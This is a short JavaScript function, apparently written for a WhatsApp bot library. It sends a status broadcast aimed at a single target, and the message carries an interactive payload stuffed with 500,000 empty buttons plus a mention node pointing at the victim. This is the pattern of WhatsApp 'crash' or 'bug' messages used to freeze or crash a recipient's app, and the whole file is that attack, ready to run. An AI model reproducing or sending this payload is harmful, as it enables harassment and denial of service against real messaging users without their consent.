async function ingpisibel(sock, target) {
    for (let z = 0; z < 1; z++) {
        await sock.relayMessage("status@broadcast", {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "zipel"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        }
                    }
                }
            }
        }, {
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target }
                        }]
                    }]
                }
            ]
        });
    }
}
